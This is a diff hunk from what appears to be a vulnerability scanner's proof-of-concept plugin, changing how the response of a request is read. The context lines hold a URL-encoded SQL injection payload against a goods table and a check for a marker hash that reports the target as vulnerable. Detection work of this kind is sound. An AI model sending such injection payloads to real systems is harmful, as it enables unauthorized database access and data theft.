@@ -54,7 +54,7 @@ class Poc(ABPoc):
                        "image_default%2Cthumbnail_pic%2Cbrief%2Cpdt_desc%2Cmktprice%2Cbig_pic%20"
                        "FROM%20sdb_goods%20limit%200%2C1%20%23")
 
-            content = requests.post(verify_url, data=payload).content
+            content = requests.post(verify_url, data=payload).text
             if '63e1f04640e83605c1d177544a5a0488' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
